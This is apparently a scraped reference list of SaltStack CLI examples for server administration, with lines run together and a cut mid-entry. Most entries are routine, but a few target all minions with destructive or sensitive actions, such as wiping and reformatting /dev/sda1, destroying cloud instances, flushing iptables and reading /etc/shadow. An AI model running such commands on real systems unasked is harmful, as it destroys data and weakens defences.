3293393493593693793893994094194294394494594694794894995095195295395495595695795895996096196296396496596696796896997097197297397497597697797897998098198298398498598698798898999099199299399499599699799899910001001100210031004100510061007100810091010101110121013101410151016101710181019102010211022102310241025102610271028102910301031103210331034salt ‘*’ acl.delfacl user myuser /tmp/house/kitchensalt ‘*’ acl.delfacl default:group mygroup /tmp/house/kitchensalt ‘*’ acl.delfacl d:u myuser /tmp/house/kitchensalt ‘*’ acl.delfacl g myuser /tmp/house/kitchen /tmp/house/livingroomsalt ‘*’ acl.getfacl /tmp/house/kitchensalt ‘*’ acl.getfacl /tmp/house/kitchen /tmp/house/livingroomsalt ‘*’ acl.addfacl user myuser rwx /tmp/house/kitchensalt ‘*’ acl.addfacl default:group mygroup rx /tmp/house/kitchensalt ‘*’ acl.addfacl d:u myuser 7 /tmp/house/kitchensalt ‘*’ acl.addfacl g mygroup 0 /tmp/house/kitchen /tmp/house/livingroomsalt ‘*’ acl.versionsalt ‘*’ acl.wipefacls /tmp/house/kitchensalt ‘*’ acl.wipefacls /tmp/house/kitchen /tmp/house/livingroomsalt ‘*’ aliases.get_target aliassalt ‘*’ aliases.has_target alias targetsalt ‘*’ aliases.list_aliasessalt ‘*’ aliases.rm_alias aliassalt ‘*’ aliases.set_target alias targetsalt ‘*’ alternatives.auto namesalt ‘*’ alternatives.check_installed name pathsalt ‘*’ alternatives.display editorsalt ‘*’ alternatives.install editor /usr/bin/editor /usr/bin/emacs23 50salt ‘*’ alternatives.remove name pathsalt ‘*’ alternatives.set name pathsalt ‘*’ alternatives.show_current editorsalt ‘*’ apache.config /etc/httpd/conf.d/ports.conf config=”[&#123;‘Listen': ’22’&#125;]”salt ‘*’ apache.directivessalt ‘*’ apache.fullversionsalt ‘*’ apache.modulessalt ‘*’ apache.server_statussalt ‘*’ apache.server_status other-profilesalt ‘*’ apache.servermodssalt ‘*’ apache.signal restartsalt ‘*’ apache.useradd /etc/httpd/htpasswd larry badpasswordsalt ‘*’ apache.useradd /etc/httpd/htpasswd larry badpass opts=nssalt ‘*’ apache.userdel /etc/httpd/htpasswd larrysalt ‘*’ apache.versionsalt ‘*’ archive.gunzip template=jinja /tmp/&#123;&#123;grains.id&#125;&#125;.txt.gzsalt ‘*’ archive.gunzip /tmp/sourcefile.txt.gzsalt ‘*’ archive.gzip template=jinja /tmp/&#123;&#123;grains.id&#125;&#125;.txtsalt ‘*’ archive.gzip /tmp/sourcefile.txtsalt ‘*’ archive.rar template=jinja /tmp/rarfile.rar ‘/tmp/sourcefile1,/tmp/&#123;&#123;grains.id&#125;&#125;.txt’salt ‘*’ archive.rar /tmp/rarfile.rar /tmp/sourcefile1,/tmp/sourcefile2salt ‘*’ archive.tar cjvf /tmp/salt.tar.bz2 &#123;&#123;grains.saltpath&#125;&#125; template=jinjasalt ‘*’ archive.tar cjvf /tmp/tarfile.tar.bz2 /tmp/file_1,/tmp/file_2salt ‘*’ archive.tar xf foo.tar dest=/target/directorysalt ‘*’ archive.unrar template=jinja /tmp/rarfile.rar /tmp/&#123;&#123;grains.id&#125;&#125;/ excludes=file_1,file_2salt ‘*’ archive.unrar /tmp/rarfile.rar /home/strongbad/ excludes=file_1,file_2salt ‘*’ archive.unzip template=jinja /tmp/zipfile.zip /tmp/&#123;&#123;grains.id&#125;&#125;/ excludes=file_1,file_2salt ‘*’ archive.unzip /tmp/zipfile.zip /home/strongbad/ excludes=file_1,file_2salt ‘*’ archive.zip template=jinja /tmp/zipfile.zip /tmp/sourcefile1,/tmp/&#123;&#123;grains.id&#125;&#125;.txtsalt ‘*’ archive.zip /tmp/zipfile.zip /tmp/sourcefile1,/tmp/sourcefile2salt ‘*’ extfs.dump /dev/sda1salt ‘*’ blockdev.tune /dev/sda1 read-ahead=1024 read-write=Truesalt ‘*’ blockdev.wipe /dev/sda1salt ‘*’ bridge.add br0salt ‘*’ bridge.addif br0 eth0salt ‘*’ bridge.delete br0salt ‘*’ bridge.delif br0 eth0salt ‘*’ bridge.find_interfaces eth0 [eth1…]salt ‘*’ bridge.interfaces br0salt ‘*’ bridge.listsalt ‘*’ bridge.showsalt ‘*’ bridge.show br0salt ‘*’ bridge.stp br0 enablesalt ‘*’ bridge.stp br0 disablesalt ‘*’ bridge.stp bridge0 enable fxp0salt ‘*’ bridge.stp bridge0 disable fxp0salt ‘*’ buildout.bootstrap /srv/mybuildoutsalt ‘*’ buildout.buildout /srv/mybuildoutsalt ‘*’ buildout.run_buildout /srv/mybuildoutsalt ‘*’ buildout.upgrade_bootstrap /srv/mybuildoutsalt ‘*’ cloud.action start instance=myinstancesalt ‘*’ cloud.action stop instance=myinstancesalt ‘*’ cloud.action show_image provider=my-ec2-config image=ami-1624987fsalt ‘*’ cloud.destroy myinstancesalt ‘*’ cloud.full_querysalt ‘*’ cloud.list_images my-gce-configsalt ‘*’ cloud.list_locations my-gce-configsalt ‘*’ cloud.list_sizes my-gce-configsalt ‘*’ cloud.profile my-gce-config myinstancesalt ‘*’ cloud.querysalt ‘*’ cloud.query list_nodes_fullsalt ‘*’ cloud.query list_nodes_selectsalt ‘*’ cloud.select_querysalt ‘*’ cmd.exec_code ruby ‘puts “cheese”‘salt ‘*’ cmd.has_exec catsalt ‘*’ cmd.retcode “file /bin/bash”salt ‘*’ cmd.retcode template=jinja “file &#123;&#123;grains.pythonpath[0]&#125;&#125;/python”salt ‘*’ cmd.retcode “grep f” stdin=’one\\ntwo\\nthree\\nfour\\nfive\\n’salt ‘*’ cmd.run “ls -l | awk ‘/foo/&#123;print \\$2&#125;'”salt ‘*’ cmd.run template=jinja “ls -l /tmp/&#123;&#123;grains.id&#125;&#125; | awk ‘/foo/&#123;print \\$2&#125;'”salt ‘*’ cmd.run “Get-ChildItem C:\\ ” shell=’powershell’salt ‘*’ cmd.run “grep f” stdin=’one\\ntwo\\nthree\\nfour\\nfive\\n’salt ‘*’ cmd.run cmd=’sed -e s/=/:/g’salt ‘*’ cmd.run_all “ls -l | awk ‘/foo/&#123;print \\$2&#125;'”salt ‘*’ cmd.run_all template=jinja “ls -l /tmp/&#123;&#123;grains.id&#125;&#125; | awk ‘/foo/&#123;print \\$2&#125;'”salt ‘*’ cmd.run_all “grep f” stdin=’one\\ntwo\\nthree\\nfour\\nfive\\n’salt ‘*’ cmd.run_chroot /var/lib/lxc/container_name/rootfs ‘sh /tmp/bootstrap.sh’salt ‘*’ cmd.run_stderr “ls -l | awk ‘/foo/&#123;print \\$2&#125;'”salt ‘*’ cmd.run_stderr template=jinja “ls -l /tmp/&#123;&#123;grains.id&#125;&#125; | awk ‘/foo/&#123;print \\$2&#125;'”salt ‘*’ cmd.run_stderr “grep f” stdin=’one\\ntwo\\nthree\\nfour\\nfive\\n’salt ‘*’ cmd.run_stdout “ls -l | awk ‘/foo/&#123;print \\$2&#125;'”salt ‘*’ cmd.run_stdout template=jinja “ls -l /tmp/&#123;&#123;grains.id&#125;&#125; | awk ‘/foo/&#123;print \\$2&#125;'”salt ‘*’ cmd.run_stdout “grep f” stdin=’one\\ntwo\\nthree\\nfour\\nfive\\n’salt ‘*’ cmd.script salt://scripts/runme.shsalt ‘*’ cmd.script salt://scripts/runme.sh ‘arg1 arg2 “arg 3″‘salt ‘*’ cmd.script salt://scripts/windows_task.ps1 args=’ -Input c:\\tmp\\infile.txt’ shell=’powershell’salt ‘*’ cmd.script salt://scripts/runme.sh stdin=’one\\ntwo\\nthree\\nfour\\nfive\\n’salt ‘*’ cmd.script_retcode salt://scripts/runme.shsalt ‘*’ cmd.script_retcode salt://scripts/runme.sh stdin=’one\\ntwo\\nthree\\nfour\\nfive\\n’salt ‘*’ cmd.tty tty0 ‘This is a test’salt ‘*’ cmd.tty pts3 ‘This is a test’salt ‘*’ cmd.which catsalt ‘*’ cmd.which_bin ‘[pip2, pip, pip-python]’salt ‘*’ composer.install /var/www/applicationsalt ‘*’ composer.install /var/www/application no_dev=True optimize=Truesalt ‘*’ config.backup_modesalt ‘*’ config.dot_vals hostsalt ‘*’ config.get pkg:apachesalt ‘*’ config.manage_modesalt ‘*’ config.merge schedulesalt ‘*’ config.option redis.hostsalt ‘*’ config.valid_fileproto salt://path/to/filesalt ‘*’ cp.cache_dir salt://path/to/dirsalt ‘*’ cp.cache_dir salt://path/to/dir include_pat=’E@*.py$’salt ‘*’ cp.cache_file salt://path/to/filesalt ‘*’ cp.cache_files salt://pathto/file1,salt://pathto/file1salt ‘*’ cp.cache_local_file /etc/hostssalt ‘*’ cp.cache_mastersalt ‘*’ cp.get_dir salt://path/to/dir/ /minion/destsalt ‘*’ cp.get_file salt://path/to/file /minion/destsalt ‘*’ cp.get_file “salt://&#123;&#123;grains.os&#125;&#125;/vimrc” /etc/vimrc template=jinjasalt ‘*’ cp.get_file_str salt://my/filesalt ‘*’ cp.get_template salt://path/to/template /minion/destsalt ‘*’ cp.get_url salt://my/file /tmp/minesalt ‘*’ cp.get_url http://www.slashdot.org /tmp/index.htmlsalt ‘*’ cp.hash_file salt://path/to/filesalt ‘*’ cp.is_cached salt://path/to/filesalt ‘*’ cp.list_mastersalt ‘*’ cp.list_master_dirssalt ‘*’ cp.list_master_symlinkssalt ‘*’ cp.list_minionsalt ‘*’ cp.list_statessalt ‘*’ cp.push /etc/fstabsalt ‘*’ cp.push /usr/lib/mysqlsalt ‘*’ cp.push_dir /etc/modprobe.d/ glob=’*.conf’salt ‘*’ cron.list_tab rootsalt ‘*’ cron.list_tab rootsalt ‘*’ cron.raw_cron rootsalt ‘*’ cron.rm_job root /usr/local/weeklysalt ‘*’ cron.rm_job root /usr/bin/foo dayweek=1salt ‘*’ cron.rm_env root MAILTOsalt ‘*’ cron.rm_job root /usr/local/weeklysalt ‘*’ cron.rm_job root /usr/bin/foo dayweek=1salt ‘*’ cron.set_env root MAILTO user@example.comsalt ‘*’ cron.set_job root ‘*’ ‘*’ ‘*’ ‘*’ 1 /usr/local/weeklysalt ‘*’ cron.set_special root @hourly ‘echo foobar’salt ‘*’ cron.write_cron_file root /tmp/new_cronsalt ‘*’ cron.write_cron_file_verbose root /tmp/new_cronsalt ‘*’ daemontools.available foosalt ‘*’ daemontools.full_restart &lt;service name&gt;salt ‘*’ daemontools.get_allsalt ‘*’ daemontools.missing foosalt ‘*’ daemontools.reload &lt;service name&gt;salt ‘*’ daemontools.restart &lt;service name&gt;salt ‘*’ daemontools.start &lt;service name&gt;salt ‘*’ daemontools.status &lt;service name&gt;salt ‘*’ daemontools.stop &lt;service name&gt;salt ‘*’ daemontools.term &lt;service name&gt;salt ‘*’ data.cas &lt;key&gt; &lt;value&gt; &lt;old_value&gt;salt ‘*’ data.clearsalt ‘*’ data.dump ‘&#123;‘eggs': ‘spam’&#125;’salt ‘*’ data.getval &lt;key&gt;salt ‘*’ data.getvals &lt;key&gt; [&lt;key&gt; …]salt ‘*’ data.loadsalt ‘*’ data.update &lt;key&gt; &lt;value&gt;salt ‘*’ defaults.get core:users:rootsalt ‘*’ disk.blkidsalt ‘*’ disk.blkid /dev/sdasalt ‘*’ disk.inodeusagesalt ‘*’ disk.percent /varsalt ‘*’ disk.usagesalt ‘*’ django.collectstatic &lt;settings_module&gt;salt ‘*’ django.command &lt;settings_module&gt; &lt;command&gt;salt ‘*’ django.createsuperuser &lt;settings_module&gt; user user@example.comsalt ‘*’ django.loaddata &lt;settings_module&gt; &lt;comma delimited list of fixtures&gt;salt ‘*’ django.syncdb &lt;settings_module&gt;salt ‘*’ dnsmasq.versionsalt ‘*’ dnsmasq.get_configsalt ‘*’ dnsmasq.get_config file=/etc/dnsmasq.confsalt ‘*’ dnsmasq.set_config domain=mydomain.comsalt ‘*’ dnsmasq.set_config follow=False domain=mydomain.comsalt ‘*’ dnsmasq.set_config file=/etc/dnsmasq.conf domain=mydomain.comsalt ‘*’ dnsmasq.versionsalt ‘*’ dnsutil.hosts_append /etc/hosts 127.0.0.1 ad1.yuk.co,ad2.yuk.cosalt ‘*’ dnsutil.hosts_remove /etc/hosts ad1.yuk.cosalt ‘*’ dnsutil.hosts_remove /etc/hosts ad2.yuk.co,ad1.yuk.cosalt ‘*’ dnsutil.parse_hostssalt ‘*’ environ.get foosalt ‘*’ environ.get baz default=Falsesalt ‘*’ environ.has_value foosalt ‘*’ environ.item foosalt ‘*’ environ.item ‘[foo, baz]’ default=Nonesalt ‘*’ environ.itemssalt ‘*’ environ.setenv ‘&#123;“foo”: “bar”, “baz”: “quux”&#125;’salt ‘*’ environ.setenv ‘&#123;“a”: “b”, “c”: False&#125;’ false_unsets=Truesalt ‘*’ environ.setval foo barsalt ‘*’ environ.setval baz val=False false_unsets=Truesalt ‘*’ event.fire ‘&#123;“data”:”my event data”&#125;’ ‘tag’salt ‘*’ event.fire_master ‘&#123;“data”:”my event data”&#125;’ ‘tag’salt ‘*’ extfs.attributes /dev/sda1salt ‘*’ extfs.blocks /dev/sda1salt ‘*’ extfs.dump /dev/sda1salt ‘*’ extfs.mkfs /dev/sda1 fs_type=ext4 opts=’acl,noexec’salt ‘*’ extfs.tune /dev/sda1 force=True label=wildstallyns opts=’acl,noexec’salt ‘*’ file.access /path/to/file fsalt ‘*’ file.access /path/to/file xsalt ‘*’ file.append /etc/motd \\salt ‘*’ file.append /etc/motd args=’cheese=spam’salt ‘*’ file.append /etc/motd args=”[‘cheese=spam’,’spam=cheese’]”salt ‘*’ file.blockreplace /etc/hosts ‘#– start managed zone foobar : DO NOT EDIT –‘ \\salt ‘*’ file.check_file_meta /etc/httpd/conf.d/httpd.conf salt://http/httpd.conf ‘&#123;hash_type: ‘md5′, ‘hsum': &lt;md5sum&gt;&#125;’ root, root, ‘755’ basesalt ‘*’ file.check_hash /etc/fstab md5:&lt;md5sum&gt;salt ‘*’ file.check_managed /etc/httpd/conf.d/httpd.conf salt://http/httpd.conf ‘&#123;hash_type: ‘md5′, ‘hsum': &lt;md5sum&gt;&#125;’ root, root, ‘755’ jinja True None None basesalt ‘*’ file.check_managed_changes /etc/httpd/conf.d/httpd.conf salt://http/httpd.conf ‘&#123;hash_type: ‘md5′, ‘hsum': &lt;md5sum&gt;&#125;’ root, root, ‘755’ jinja True None None basesalt ‘*’ file.check_perms /etc/sudoers ‘&#123;&#125;’ root root 400salt ‘*’ file.chgrp /etc/passwd rootsalt ‘*’ file.chown /etc/passwd root rootsalt ‘*’ file.comment /etc/modules pcspkrsalt ‘*’ file.contains /etc/crontab ‘mymaintenance.sh’salt ‘*’ file.contains_glob /etc/foobar ‘*cheese*’salt ‘*’ file.contains_regex /etc/crontabsalt ‘*’ file.contains_regex_multiline /etc/crontab ‘^maint’salt ‘*’ file.copy /path/to/src /path/to/dstsalt ‘*’ file.copy /path/to/src_dir /path/to/dst_dir recurse=Truesalt ‘*’ file.copy /path/to/src_dir /path/to/dst_dir recurse=True remove_existing=Truesalt ‘*’ file.restore_backup /foo/bar/baz.txt 0salt ‘*’ file.directory_exists /etcsalt ‘*’ file.extract_hash /etc/foo sha512 /path/to/hash/filesalt ‘*’ file.file_exists /etc/passwdsalt ‘*’ file.find / type=f name=\\*.bak size=+10msalt ‘*’ file.find /var mtime=+30d size=+10m print=path,size,mtimesalt ‘*’ file.find /var/log name=\\*.[0-9] mtime=+30d size=+10m deletesalt ‘*’ file.get_devmm /dev/chrsalt ‘*’ file.get_diff /home/fred/.vimrc salt://users/fred/.vimrcsalt ‘*’ file.get_gid /etc/passwdsalt ‘*’ file.get_group /etc/passwdsalt ‘*’ file.get_hash /etc/shadowsalt ‘*’ file.get_managed /etc/httpd/conf.d/httpd.conf jinja salt://http/httpd.conf ‘&#123;hash_type: ‘md5′, ‘hsum': &lt;md5sum&gt;&#125;’ root root ‘755’ base None Nonesalt ‘*’ file.get_mode /etc/passwdsalt ‘*’ file.get_selinux_context /etc/hostssalt ‘*’ file.get_sum /etc/passwd sha512salt ‘*’ file.get_uid /etc/passwdsalt ‘*’ file.get_user /etc/passwdsalt ‘*’ file.gid_to_group 0salt ‘*’ file.grep /etc/passwd nobodysalt ‘*’ file.grep /etc/sysconfig/network-scripts/ifcfg-eth0 ipaddr ” -i”salt ‘*’ file.grep /etc/sysconfig/network-scripts/ifcfg-eth0 ipaddr ” -i -B2″salt ‘*’ file.grep “/etc/sysconfig/network-scripts/*” ipaddr ” -i -l”salt ‘*’ file.group_to_gid rootsalt ‘*’ file.is_blkdev /dev/blksalt ‘*’ file.is_chrdev /dev/chrsalt ‘*’ file.is_fifo /dev/fifosalt ‘*’ file.is_link /path/to/linksalt ‘*’ file.join ‘/’ ‘usr’ ‘local’ ‘bin’salt ‘*’ file.chown /etc/passwd root rootsalt ‘*’ file.link /path/to/file /path/to/linksalt ‘*’ file.list_backups /foo/bar/baz.txtsalt ‘*’ file.list_backups /foo/bar/baz.txtsalt ‘*’ file.lstat /path/to/filesalt ‘*’ file.makedirs /opt/code/salt ‘*’ file.makedirs_perms /opt/codesalt ‘*’ file.manage_file /etc/httpd/conf.d/httpd.conf ” ‘&#123;&#125;’ salt://http/httpd.conf ‘&#123;hash_type: ‘md5′, ‘hsum': &lt;md5sum&gt;&#125;’ root root ‘755’ base ”salt ‘*’ file.mkdir /opt/jetty/contextsalt ‘*’ file.mknod /dev/chr c 180 31salt ‘*’ file.mknod /dev/blk b 8 999salt ‘*’ file.nknod /dev/fifo psalt ‘*’ file.mknod_blkdev /dev/blk 8 999salt ‘*’ file.mknod_chrdev /dev/chr 180 31salt ‘*’ file.mknod_fifo /dev/fifosalt ‘*’ file.open_filessalt ‘*’ file.open_files by_pid=Truesalt ‘*’ file.pardirsalt ‘*’ file.patch /opt/file.txt /tmp/file.txt.patchsalt ‘*’ file.path_exists_glob /etc/pam*/pass*salt ‘*’ file.prepend /etc/motd \\salt ‘*’ file.prepend /etc/motd args=’cheese=spam’salt ‘*’ file.prepend /etc/motd args=”[‘cheese=spam’,’spam=cheese’]”salt ‘*’ file.sed /etc/httpd/httpd.conf ‘LogLevel warn’ ‘LogLevel info’salt ‘*’ file.readdir /path/to/dir/salt ‘*’ file.readlink /path/to/linksalt ‘*’ file.remove /tmp/foosalt ‘*’ file.restore_backup /foo/bar/baz.txt 0salt ‘*’ file.rename /path/to/src /path/to/dstsalt ‘*’ file.replace /path/to/file pattern=”bind-address\\s*=” repl=’bind-address:’salt ‘*’ file.replace /path/to/file pattern=’=’ repl=':’salt ‘*’ file.replace /etc/httpd/httpd.conf pattern=’LogLevel warn’ repl=’LogLevel info’salt ‘*’ file.replace /some/file pattern=’before’ repl=’after’ flags='[MULTILINE, IGNORECASE]’salt ‘*’ file.restore_backup /foo/bar/baz.txt 0salt ‘*’ file.restorecon /home/user/.ssh/authorized_keyssalt ‘*’ file.rmdir /tmp/foo/salt ‘*’ file.search /etc/crontab ‘mymaintenance.sh’salt ‘*’ file.sed /etc/httpd/httpd.conf ‘LogLevel warn’ ‘LogLevel info’salt ‘*’ file.contains /etc/crontab ‘mymaintenance.sh’salt ‘*’ file.seek_read /path/to/file 4096 0salt ‘*’ file.seek_write /path/to/file ‘some data’ 4096salt ‘*’ file.set_mode /etc/passwd 0644salt ‘*’ file.set_selinux_context path &lt;role&gt; &lt;type&gt; &lt;range&gt;salt ‘*’ file.source_list salt://http/httpd.conf ‘&#123;hash_type: ‘md5′, ‘hsum': &lt;md5sum&gt;&#125;’ basesalt ‘*’ file.stats /etc/passwdsalt ‘*’ file.statvfs /path/to/filesalt ‘*’ file.symlink /path/to/file /path/to/linksalt ‘*’ file.touch /var/log/emptyfilesalt ‘*’ file.truncate /path/to/file 512salt ‘*’ file.uid_to_user 0salt ‘*’ file.uncomment /etc/hosts.deny ‘ALL: PARANOID’salt ‘*’ file.user_to_uid rootsalt ‘*’ file.write /etc/motd \\salt ‘*’ file.write /etc/motd args=’cheese=spam’salt ‘*’ file.write /etc/motd args=”[‘cheese=spam’,’spam=cheese’]”salt ‘*’ gem.install vagrantsalt ‘*’ gem.listsalt ‘*’ gem.sources_add http://rubygems.org/salt ‘*’ gem.sources_listsalt ‘*’ gem.sources_remove http://rubygems.org/salt ‘*’ gem.uninstall vagrantsalt ‘*’ gem.update vagrantsalt ‘*’ gem.update_systemsalt ‘*’ grains.append key valsalt ‘*’ grains.delval keysalt ‘*’ grains.filter_by ‘&#123;Debian: Debheads rule, RedHat: I love my hat&#125;’salt ‘*’ grains.filter_by ‘&#123;A: B, C: &#123;D: &#123;E: F,G: H&#125;&#125;&#125;’ ‘xxx’ ‘&#123;D: &#123;E: I&#125;,J: K&#125;’ ‘C’salt ‘*’ grains.get pkg:apachesalt ‘*’ grains.get_or_set_hash ‘django:SECRET_KEY’ 50salt ‘*’ grains.has_value pkg:apachesalt ‘*’ grains.item ossalt ‘*’ grains.item os osrelease oscodenamesalt ‘*’ grains.item host sanitize=Truesalt ‘*’ grains.itemssalt ‘*’ grains.items sanitize=Truesalt ‘*’ grains.lssalt ‘*’ grains.remove key valsalt ‘*’ grains.setval key valsalt ‘*’ grains.setval key “&#123;‘sub-key': ‘val’, ‘sub-key2′: ‘val2′&#125;”salt ‘*’ grains.setvals “&#123;‘key1′: ‘val1′, ‘key2′: ‘val2′&#125;”salt ‘*’ group.add foo 3456salt ‘*’ group.adduser foo barsalt ‘*’ group.chgid foo 4376salt ‘*’ group.delete foosalt ‘*’ group.deluser foo barsalt ‘*’ group.getentsalt ‘*’ group.info foosalt ‘*’ group.members foo ‘user1,user2,user3,…’salt ‘*’ grub.confsalt ‘*’ grub.versionsalt ‘*’ hashutil.base64_decodestring ‘Z2V0IHNhbHRlZA==salt ‘*’ hashutil.base64_encodestring ‘get salted’salt ‘*’ hashutil.hmac_signature ‘get salted’ ‘shared secret’ ‘NS2BvKxFRk+rndAlFbCYIFNVkPtI/3KiIYQw4okNKU8=’salt ‘*’ hashutil.md5_digest ‘get salted’salt ‘*’ hashutil.sha256_digest ‘get salted’salt ‘*’ hashutil.sha512_digest ‘get salted’salt ‘*’ hg.archive /path/to/repo output=/tmp/archive.tgz fmt=tgzsalt ‘*’ hg.clone /path/to/repo https://bitbucket.org/birkenfeld/sphinxsalt ‘*’ hg.describe /path/to/reposalt ‘*’ hg.pull /path/to/repo opts=-usalt ‘*’ hg.revision /path/to/repo mybranchsalt ‘*’ hosts.add_host &lt;ip&gt; &lt;alias&gt;salt ‘*’ hosts.get_alias &lt;ip addr&gt;salt ‘*’ hosts.get_ip &lt;hostname&gt;salt ‘*’ hosts.has_pair &lt;ip&gt; &lt;alias&gt;salt ‘*’ hosts.list_hostssalt ‘*’ hosts.rm_host &lt;ip&gt; &lt;alias&gt;salt ‘*’ hosts.set_host &lt;ip&gt; &lt;alias&gt;salt ‘*’ img.bootstrap /srv/salt-images/host.qcow 4096 qcow2salt ‘*’ img.mount_image /tmp/foosalt ‘*’ img.mount_image /tmp/foosalt ‘*’ img.umount_image /mnt/foosalt ‘*’ incron.list_tab rootsalt ‘*’ incron.list_tab rootsalt ‘*’ incron.raw_cron rootsalt ‘*’ incron.raw_system_cronsalt ‘*’ incron.rm_job root /pathsalt ‘*’ incron.rm_job root /pathsalt ‘*’ incron.set_job root ‘/root’ ‘IN_MODIFY’ ‘echo “$$ $@ $# $% $&amp;”‘salt ‘*’ incron.write_incron_file_verbose root /tmp/new_cronsalt ‘*’ incron.write_cron_file root /tmp/new_cronsalt ‘*’ ini.get_option /path/to/ini section_name option_namesalt ‘*’ ini.get_section /path/to/ini section_namesalt ‘*’ ini.remove_option /path/to/ini section_name option_namesalt ‘*’ ini.remove_section /path/to/ini section_namesalt ‘*’ ini.set_option /path/to/ini ‘&#123;section_foo: &#123;key: value&#125;&#125;’salt ‘*’ ip.apply_network_settingssalt ‘*’ ip.build_bond bond0 mode=balance-albsalt ‘*’ ip.build_interface eth0 eth &lt;settings&gt;salt ‘*’ ip.build_network_settings &lt;settings&gt;salt ‘*’ ip.build_routes eth0 &lt;settings&gt;salt ‘*’ ip.down eth0salt ‘*’ ip.get_bond bond0salt ‘*’ ip.get_interface eth0salt ‘*’ ip.get_network_settingssalt ‘*’ ip.get_routes eth0salt ‘*’ ip.up eth0salt ‘*’ iptables.append filter INPUT \\salt ‘*’ iptables.append filter INPUT \\salt ‘*’ iptables.build_rule match=state \\salt ‘*’ iptables.build_rule filter INPUT command=I position=3 \\salt ‘*’ iptables.build_rule filter INPUT command=A \\salt ‘*’ iptables.build_rule filter INPUT command=A \\salt ‘*’ iptables.build_rule filter INPUT command=A \\salt ‘*’ iptables.build_rule match=state \\salt ‘*’ iptables.build_rule filter INPUT command=I position=3 \\salt ‘*’ iptables.check filter INPUT \\salt ‘*’ iptables.check filter INPUT \\salt ‘*’ iptables.check_chain filter INPUTsalt ‘*’ iptables.check_chain filter INPUT family=ipv6salt ‘*’ iptables.delete filter INPUT position=3salt ‘*’ iptables.delete filter INPUT \\salt ‘*’ iptables.delete filter INPUT position=3 family=ipv6salt ‘*’ iptables.delete filter INPUT \\salt ‘*’ iptables.delete_chain filter CUSTOM_CHAINsalt ‘*’ iptables.delete_chain filter CUSTOM_CHAIN family=ipv6salt ‘*’ iptables.flush filter INPUTsalt ‘*’ iptables.flush filter INPUT family=ipv6salt ‘*’ iptables.get_policy filter INPUTsalt ‘*’ iptables.get_policy filter INPUT family=ipv6salt ‘*’ iptables.get_rulessalt ‘*’ iptables.get_rules family=ipv6salt ‘*’ iptables.get_saved_policy filter INPUTsalt ‘*’ iptables.get_saved_policy filter INPUT \\salt ‘*’ iptables.get_saved_policy filter INPUT family=ipv6salt ‘*’ iptables.get_saved_policy filter INPUT \\salt ‘*’ iptables.get_saved_rulessalt ‘*’ iptables.get_saved_rules family=ipv6salt ‘*’ iptables.insert filter INPUT position=3 \\salt ‘*’ iptables.insert filter INPUT position=3 \\salt ‘*’ iptables.new_chain filter CUSTOM_CHAINsalt ‘*’ iptables.new_chain filter CUSTOM_CHAIN family=ipv6salt ‘*’ iptables.save /etc/sysconfig/iptablessalt ‘*’ iptables.save /etc/sysconfig/iptables family=ipv6salt ‘*’ iptables.set_policy filter INPUT ACCEPTsalt ‘*’ iptables.set_policy filter INPUT ACCEPT family=ipv6salt ‘*’ iptables.versionsalt ‘*’ iptables.version family=ipv6salt ‘*’ key.fingersalt ‘*’ key.finger_mastersalt ‘*’ kmod.availablesalt ‘*’ kmod.check_available kvmsalt ‘*’ kmod.is_loaded kvmsalt ‘*’ kmod.load kvmsalt ‘*’ kmod.lsmodsalt ‘*’ kmod.mod_listsalt ‘*’ kmod.remove kvmsalt ‘*’ locale.avail ‘en_US.UTF-8′salt ‘*’ locale.gen_locale ‘en_US.UTF-8′salt ‘*’ locale.get_localesalt ‘*’ locale.list_availsalt ‘*’ locale.set_locale ‘en_US.UTF-8′salt ‘*’ locate.locatesalt ‘*’ locate.statssalt ‘*’ locate.updatedbsalt ‘*’ locate.versionsalt ‘*’ logrotate.set rotate 2salt ‘*’ logrotate.set /var/log/wtmp rotate 2salt ‘*’ logrotate.show_confsalt ‘*’ lowpkg.file_dict httpdsalt ‘*’ lowpkg.file_dict httpd postfixsalt ‘*’ lowpkg.file_dictsalt ‘*’ lowpkg.file_list httpdsalt ‘*’ lowpkg.file_list httpd postfixsalt ‘*’ lowpkg.file_listsalt ‘*’ lowpkg.list_pkgssalt ‘*’ lowpkg.verifysalt ‘*’ lowpkg.verify httpdsalt ‘*’ lowpkg.verify ‘httpd postfix’salt ‘*’ lowpkg.verify ‘httpd postfix’ ignore_types=[‘config’,’doc’]salt ‘*’ lvm.fullversionsalt ‘*’ lvm.lvcreate new_volume_name vg_name size=10Gsalt ‘*’ lvm.lvcreate new_volume_name vg_name extents=100 /dev/sdbsalt ‘*’ lvm.lvcreate new_snapshot vg_name snapshot=volume_name size=3Gsalt ‘*’ lvm.lvdisplaysalt ‘*’ lvm.lvdisplay /dev/vg_myserver/rootsalt ‘*’ lvm.lvremove lvname vgname force=Truesalt ‘*’ lvm.pvdisplaysalt ‘*’ lvm.pvdisplay /dev/md0salt ‘*’ lvm.versionsalt ‘*’ lvm.vgdisplaysalt ‘*’ lvm.vgdisplay nova-volumessalt ‘*’ match.compound ‘L@cheese,foo and *’salt ‘*’ match.data ‘spam:eggs’salt ‘*’ match.filter_by ‘&#123;foo*: Foo!, bar*: Bar!&#125;’ minion_id=bar03salt ‘*’ match.glob ‘*’salt ‘*’ match.grain ‘os:Ubuntu’salt ‘*’ match.grain ‘ipv6|2001:db8::ff00:42:8329′ delimiter=’|’salt ‘*’ match.grain_pcre ‘os:Fedo.*’salt ‘*’ match.grain_pcre ‘ipv6|2001:.*’ delimiter=’|’salt ‘*’ match.ipcidr ‘192.168.44.0/24′salt ‘*’ match.list ‘server1,server2′salt ‘*’ match.pcre ‘.*’salt ‘*’ match.pillar ‘cheese:foo’salt ‘*’ match.pillar ‘clone_url|https://github.com/saltstack/salt.git’ delimiter=’|’salt ‘*’ mine.delete ‘network.interfaces’salt ‘*’ mine.flushsalt ‘*’ mine.get ‘*’ network.interfacessalt ‘*’ mine.get ‘os:Fedora’ network.interfaces grainsalt ‘*’ mine.get ‘os:Fedora and S@192.168.5.0/24′ network.ipaddrs compoundsalt ‘*’ mine.get_dockersalt ‘*’ mine.get_docker interfaces=’eth0′salt ‘*’ mine.get_docker interfaces='[“eth0″, “eth1″]’salt ‘*’ mine.get_docker cidrs=’107.170.147.0/24′salt ‘*’ mine.get_docker cidrs='[“107.170.147.0/24″, “172.17.42.0/24″]’salt ‘*’ mine.get_docker interfaces='[“eth0″, “eth1″]’ cidrs='[“107.170.147.0/24″, “172.17.42.0/24″]’salt ‘*’ mine.send network.interfaces eth0salt ‘*’ mine.updatesalt ‘*’ modjk.bulk_activate node1,node2,node3 loadbalancer1salt ‘*’ modjk.bulk_activate node1,node2,node3 loadbalancer1 other-profilesalt ‘*’ modjk.bulk_activate 